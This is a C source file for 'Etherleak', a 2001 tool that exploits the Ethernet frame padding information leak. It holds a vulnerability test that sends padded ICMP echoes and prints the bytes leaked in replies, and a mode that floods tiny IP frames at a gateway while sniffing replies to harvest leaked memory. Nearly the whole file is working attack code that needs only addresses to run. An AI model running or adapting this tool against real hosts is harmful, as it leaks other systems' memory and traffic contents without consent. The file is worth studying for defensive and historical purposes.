/*
 * Copyright (C) 2001 Stealth.
 * All rights reserved.
 *
 * THIS IS NOT OPEN SOURCE, SO READ ON.
 *
 * Redistribution in source and binary forms, with or without
 * modification, are NOT permitted.
 *
 * Use of this software is permitted provided that the following conditions
 * are met:
 *
 * 1. You may not use this software to cause damage or any other illegal
 *    activities. It is for educational purpose only. You may not use this
 *    software for commercial purposes.
 * 2. You may change the sourcode to meet your needs. You are not allowed
 *    to change this copyright notice.
 * 3. This is private sourcecode, you should have received this file only
 *    from the author itself.
 * 4. The author may change the above copyright at any time. He may even publish
 *    this code without notify you first. 
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */
#include <stdio.h>
#include <sys/types.h>
#include <libnet.h>
#include <pthread.h>
#include <pcap.h>
#include "tcp.h"


struct {
	char *dev;
	int promisc;
	unsigned char my_mac[6], gw_mac[6];
	char *my_ip;
} options;

/*
 {"eth0", 0, 
	{0x00, 0x50, 0x22, 0x88, 0x29, 0x93},
	{0x00, 0x40, 0x05, 0x6d, 0x1a, 0x90},
	"192.0.0.1"
};
*/

pcap_t *pcap_prepare(char *);
void complain(const char *);


int opt_fill_mac(const char *mac_format, unsigned char mac[6])
{
	int n;
	unsigned short int t[6];

	n = sscanf(mac_format, "%02hx:%02hx:%02hx:%02hx:%02hx:%02hx",
			&t[0], &t[1], &t[2],
			&t[3], &t[4], &t[5]);

	mac[0] = (u_char)t[0];
	mac[1] = (u_char)t[1];
	mac[2] = (u_char)t[2];
	mac[3] = (u_char)t[3];
	mac[4] = (u_char)t[4];
	mac[5] = (u_char)t[5];

	return n == 6 ? 0 : -1;
}


/* Check wheter 'target' is vulnerable to
 * ether-leakage
 */
void vulnerability_test(const char *target)
{
	pcap_t *pcap_handle;
	char fstring[1024], send_pack[128],
		*payload = "XXXXXXXXXXXXXXXXXX";	/* 18byte */
	u_long src_l, dst_l;
	struct hostent *he;
	struct pcap_pkthdr phdr;
	u_char *pkt;

	int r, raw_fd = libnet_open_raw_sock(IPPROTO_ICMP);

	snprintf(fstring, sizeof(fstring),"icmp and dst host %s and icmp[0]==0",
			options.my_ip);

	pcap_handle = pcap_prepare(fstring);
	
	r = libnet_build_icmp_echo(8, 0, 0x7350, 1, payload, 18,
		&send_pack[LIBNET_IP_H]);
	if (r < 0)
		complain("libnet_build_icmp_echo failed\n");

	if ((he = gethostbyname(options.my_ip)) == NULL) {
		herror("gethostbyname");
		exit(7);
	}
	src_l = *(u_long*)he->h_addr;
	if ((he = gethostbyname(target)) == NULL) {
		herror("gethostbyname");
		exit(7);
	}
	dst_l = *(u_long*)he->h_addr;

	r = libnet_build_ip(0,
			0,  /* TOS */
			0,  /* ID  */
			0,  /* frag */
			64, /* TTL */
			IPPROTO_ICMP,
			src_l, dst_l,
			&send_pack[LIBNET_IP_H],
			LIBNET_ICMP_ECHO_H+18, send_pack);

	if (r < 0)
		complain("libnet_build_ip failed\n");

	/* send normal packet, one that fits to 46 byte of payload */
	libnet_do_checksum(send_pack, IPPROTO_ICMP,
			LIBNET_ICMP_ECHO_H+18);

	libnet_write_ip(raw_fd, send_pack, 46);

	/* send shport packet (1 byte payload) */
	send_pack[LIBNET_IP_H+LIBNET_ICMP_ECHO_H] = 'Y';
	libnet_do_checksum(send_pack, IPPROTO_ICMP,
			LIBNET_ICMP_ECHO_H+1);
	libnet_write_ip(raw_fd, send_pack, 29);
	

	for (r = 0; r != 2;)
		if ((pkt = pcap_next(pcap_handle, &phdr)))
			++r;

	libnet_close_raw_sock(raw_fd);

	if (phdr.len != 60) {
		printf("'%s' not vulnerable (!= 60 byte in reply)\n", target);
		exit(0);
	}

	if (pkt[14+20+8+3] == 'X')
		printf("'%s' vulnerable!\n", target);
	else
		printf("'%s' not vulnerable!\n", target);

	printf("Got '");
	write(1, &pkt[14+20+8], 18);
	printf("'\n");

	exit(0);
}
	

void usage()
{
	fprintf(stderr, "Usage: etherleak <-I my_IP> <-S my_MAC> <-T gw_MAC>\n"\
			"                 [-D device] [-P promisc] [-V v]\n\n");
	exit(1);
}


void die(const char *s)
{
	perror(s);
	exit(errno);
}


void complain(const char *s)
{
	fprintf(stderr, "%s", s);
	exit(2);
}


char last_seen[26];


void process_packet(u_char *user, const struct pcap_pkthdr *pkthdr,
		   const u_char *pkt)
{
	struct e_tcphdr *tcph = (struct e_tcphdr*)(pkt+14+20);

	if (memcmp(last_seen, pkt+14+20, 26) == 0)
		return;
	memcpy(last_seen, pkt+14+20, 26);
	printf("%d->%d ", ntohs(tcph->th_sport), ntohs(tcph->th_dport));
	write(1, pkt+14+20+20, 6);
	printf("\n");
}


pcap_t *pcap_prepare(char *filter_string)
{
	char ebuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = NULL;
	u_int32_t localnet, netmask;
	struct bpf_program filter;

	handle = pcap_open_live(options.dev, 512, options.promisc, 100, ebuf);
	if (!handle)
		die(ebuf);

	if (pcap_lookupnet(options.dev, &localnet, &netmask, ebuf) < 0)
		die(ebuf);

	if (pcap_compile(handle, &filter, filter_string, 1, netmask) < 0) {
		fprintf(stderr, "Can't compile filter %s\n", filter_string);
		exit(5);
	}

	if (pcap_setfilter(handle, &filter) < 0) {
		fprintf(stderr, "Can't set filter.\n");
		exit(6);
	}
	return handle;
}



void *capture_thread(void *vp)
{
	pcap_t *handle = NULL;
	char fstring[1024];

	snprintf(fstring, sizeof(fstring), "ether dst %x:%x:%x:%x:%x:%x", 
		options.my_mac[0], options.my_mac[1], options.my_mac[2],
		options.my_mac[3], options.my_mac[4], options.my_mac[5]);

	handle = pcap_prepare(fstring);
	pcap_loop(handle, -1, process_packet, NULL);
	return NULL;
}


void *send_thread(void *vp)
{
	struct hostent *src, *dst;
	int r;
	u_long src_l, dst_l;
	char buf[100], ebuf[1024];
	struct libnet_link_int *link;


	if ((src = gethostbyname(options.my_ip)) == NULL) {
		herror("gethostbyname");
		exit(h_errno);
	}
	src_l = *(u_long*)src->h_addr;
	if ((dst = gethostbyname(options.my_ip)) == NULL) {
		herror("gethostbyname");
		exit(h_errno);
	}
	dst_l = *(u_long*)dst->h_addr;

        link = libnet_open_link_interface(options.dev, ebuf);
	
	r = libnet_build_ip(0,
			0,  /* TOS */
			0,  /* ID  */
			0,  /* frag */
			64, /* TTL */
			IPPROTO_IP,
			src_l, dst_l,
			NULL,
			0, &buf[LIBNET_ETH_H]);
	if (r < 0)
		complain("libnet_build_ip failed\n");

	r = libnet_build_ethernet(options.gw_mac, options.my_mac, ETHERTYPE_IP,
		&buf[LIBNET_ETH_H], IP_H, buf);

	if (r < 0)
		complain("libnet_build_ethernet failed");

	libnet_do_checksum(&buf[LIBNET_ETH_H], IPPROTO_IP, IP_H);

	for (;;) {
		libnet_write_link_layer(link, options.dev, buf,
			IP_H+LIBNET_ETH_H);
		usleep(2000);
	}
	libnet_close_link_interface(link);
	return NULL;
}


int main(int argc, char **argv)
{
	pthread_t tid1, tid2;
	void *r;
	int c;
	char *vuln_test = NULL;

	memset(&options, 0, sizeof(options));
	options.dev = strdup("eth0");
	options.promisc = 1;

	printf("Etherleak (C) 2001 by Stealth. >>> Confidential <<<\n\n");

	while ((c = getopt(argc, argv, "S:T:I:D:P:V:")) != -1) {
		switch (c) {
		case 'I':
			options.my_ip = strdup(optarg);
			break;
		case 'S':
			if (opt_fill_mac(optarg, options.my_mac) < 0)
				complain("Can't parse src MAC\n");
			break;
		case 'T':
			if (opt_fill_mac(optarg, options.gw_mac) < 0)
				complain("Can't parse dst MAC\n");
			break;
		case 'D':
			free(options.dev);
			options.dev = strdup(optarg);
			break;
		case 'P':
			options.promisc = atoi(optarg);
			break;
		case 'V':
			vuln_test = strdup(optarg);
			break;
		default:
			usage();
		}
	}

	if (!options.my_mac || !options.gw_mac || !options.my_ip)
		usage();

	setbuffer(stdout, NULL, 0);

	if (vuln_test)
		vulnerability_test(vuln_test); /* never returns */


	pthread_create(&tid1, NULL, send_thread, NULL);
	pthread_create(&tid2, NULL, capture_thread, NULL);

	pthread_join(tid1, &r);
	pthread_join(tid2, &r);

	return 0;
}

